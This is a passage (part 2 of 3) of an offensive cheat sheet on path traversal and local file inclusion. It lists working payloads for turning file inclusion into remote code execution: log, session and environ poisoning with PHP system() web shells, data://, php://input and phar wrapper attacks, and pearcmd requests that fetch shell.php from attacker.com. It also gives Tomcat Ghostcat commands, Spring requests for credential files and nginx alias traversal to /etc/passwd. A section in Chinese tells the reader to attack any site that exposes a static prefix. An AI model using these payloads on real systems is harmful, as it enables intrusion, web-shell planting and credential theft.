# path-traversal-lfi-test · part 2

> 分段 2/3。完整索引见 `path-traversal-lfi-test.md`。

## 16. LFI TO RCE — ESCALATION PATHS

### 1. /proc/self/fd Brute-Force
```
# When file upload exists but path is unknown:
# Uploaded files get temporary fd in /proc/self/fd/
# Brute-force fd numbers:
/proc/self/fd/0 through /proc/self/fd/255
# Include the temp file before it's cleaned up
```

### 2. /proc/self/environ Poisoning
```
# If User-Agent is reflected in process environment:
GET /vuln.php?page=/proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
```

### 3. Log Poisoning
```
# Apache access log:
GET /<?php system($_GET['c']); ?> HTTP/1.1
# Then include: /var/log/apache2/access.log

# SSH auth log (username field):
ssh '<?php system($_GET["c"]); ?>'@target
# Then include: /var/log/auth.log

# Mail log (SMTP subject):
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: <?php system($_GET['c']); ?>
.
# Then include: /var/log/mail.log
```

### 4. PHP Session File Poisoning
```
# Set session variable to PHP code:
GET /page.php?lang=<?php system($_GET['c']); ?>
# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
# Include the session file
```

### 5. phpinfo() Assisted LFI
```
# Race condition: upload via phpinfo() temp file
# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
# 2. Include the temp file before PHP cleans it up
# Requires many concurrent requests (race window ~10ms)
```

### 6. iconv CVE-2024-2961
```
# glibc iconv buffer overflow in PHP filter chains
# Tool: cfreal/cnext-exploits
# Converts LFI to RCE without needing writable paths or log poisoning
```

---
## 17. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (file read without execution)
```
# Base64 encode source code:
php://filter/convert.base64-encode/resource=index.php

# ROT13:
php://filter/read=string.rot13/resource=index.php

# Chain multiple filters:
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Zlib compression:
php://filter/zlib.deflate/resource=index.php

# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
# Generates chains that write arbitrary content via iconv conversions
# Tool: synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

### convert.iconv + dechunk Oracle (blind file read)
```
# Error-based oracle: determine if first byte of file matches a character
# Tool: synacktiv/php_filter_chains_oracle_exploit
# Reads files byte-by-byte through error/behavior differences
```

### data:// Wrapper
```
# Execute arbitrary PHP:
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Bypass when data:// is filtered but data: (without //) works:
data:text/plain,<?php system('id'); ?>
```

### expect:// Wrapper
```
expect://id
expect://ls
# Requires expect extension (rare but check)
```

### php://input
```
POST /vuln.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### zip:// and phar:// Wrappers
```
# zip://: Upload ZIP containing PHP file
zip:///tmp/upload.zip#shell.php

# phar://: Triggers deserialization of phar metadata!
phar:///tmp/upload.phar/anything
# Create malicious phar with crafted metadata object
# Can chain to RCE via POP gadget chains (like PHP deserialization)
# Phar can be disguised as JPG (polyglot phar-jpg)
```

### wrapwrap (prefix/suffix injection)
```
# Tool: ambionics/wrapwrap
# Adds arbitrary prefix and suffix to file content via filter chains
# Useful for converting file read into XXE, SSRF, or deserialization trigger
```

---
## 18. PEARCMD LFI TO RCE

When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):

```
# Method 1: config-create (write arbitrary content to file)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# Method 2: man_dir (change docs directory to write path)
GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php

# Method 3: download (fetch remote file)
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php

# Method 4: install (install remote package)
GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
```

### Windows FindFirstFile Wildcard
```
# Windows << and > wildcards in file paths:
# << matches any extension, > matches single char
include("php<<");      # Matches any .php* file
include("shel>");      # Matches shell.php if only 1 char follows
# Useful when exact filename is unknown
```

---
## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS

### Common Vulnerable Parameter Names
```
filename    filepath    path        file        url
template    page        include     dir         document
folder      root        pg          lang        doc
conf        data        content     name        src
inputFile   hdfile      XFileName   FileUrl     readfile
```

### High-Frequency Vulnerable Endpoints
| Endpoint Pattern | Frequency |
|---|---|
| `down.php` / `download.php` | Very High |
| `download.jsp` / `download.do` | Very High |
| `download.asp` / `download.aspx` | High |
| `readfile.php` / `file.php` | High |
| `export` / `report` endpoints | Medium |
| `template` / `preview` endpoints | Medium |

### Bypass Technique Distribution (from field research)
| Technique | Prevalence |
|---|---|
| Absolute path direct access | Most common |
| WEB-INF/web.xml read (Java) | Common |
| Base64 encoded path parameter | Moderate |
| Double URL encoding | Moderate |
| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |

---
## 20. JAVA / SPRING PATH TRAVERSAL

### Spring Resource Loading

```java
// Vulnerable patterns — user input flows into resource path
ClassPathResource r = new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
# Read WEB-INF deployment descriptor
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml

# Spring Boot specific
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
```

### High-value Java targets

```text
/WEB-INF/web.xml                        ← servlet mappings, filter chains, security constraints
/WEB-INF/classes/application.properties  ← DB creds, API keys, Spring config
/WEB-INF/classes/application.yml         ← same, YAML format
/WEB-INF/lib/                            ← application JARs (download for decompilation)
/META-INF/MANIFEST.MF                    ← build metadata, main class
/META-INF/context.xml                    ← Tomcat datasource definitions
```

### Spring MVC `ResourceHttpRequestHandler`

When static resources are served via `spring.resources.static-locations`:
```text
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml       ← Tomcat path parameter normalization
```

---
## 21. TOMCAT-SPECIFIC TRICKS

### Path Parameter Normalization (`/..;/`)

Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:

```text
GET /app/..;/manager/html           ← Tomcat resolves to /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
```

**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up.

### AJP Ghostcat (CVE-2020-1938)

Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:

```text
# Read any file through AJP
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

# Include attacker-controlled file as JSP for execution
python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31.

### Tomcat double-URL-decode

```text
GET /%252e%252e/%252e%252e/etc/passwd
```

---
## 22. NGINX ALIAS MISCONFIGURATION

### Nginx alias 缺斜杠（战法索引有指针）

认：站上已有 `/static`、`/assets`、`/img`、`/files` 这类前缀（黑盒看不见 nginx 配置，有前缀就打）；或 Caddy 模板吃用户输入。

打：

1. `GET /static../etc/passwd`、`GET /static../etc/nginx/nginx.conf`、`GET /assets..%2f..%2fetc%2fpasswd`。
2. 对照：`/static/../etc/passwd` 常被规范化挡掉，**缺斜杠那一枪**才是 alias 替换前缀。
3. Caddy 模板面：输入里试 `{{readFile "/etc/passwd"}}`、`{{.Req.Host}}`。读到文件才算，只反射 Host 不算本条。

算成：读到 web 根以外的配置 / 密钥 / `nginx.conf`。只能列静态目录里本来就有的 css/图 → 没成。

假点：404；alias 两边都有斜杠，规范化后出不去；Caddy 模板不执行用户输入。单站没中不删战法索引这行。有静态前缀就打，不必先看见 nginx 配置。普通 `file=` 穿越仍走上面通用段，两枪不互相替代。

### The trailing-slash trap

```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /data/;
}
```

Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

**Correct configuration**:
```nginx
location /assets/ {
    alias /data/;
}
```

### Off-by-one in `location` + `alias`

```nginx
location /img {
    alias /var/images;
}
# /img../secret -> /var/images/../secret -> /var/secret
```

Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does.

---
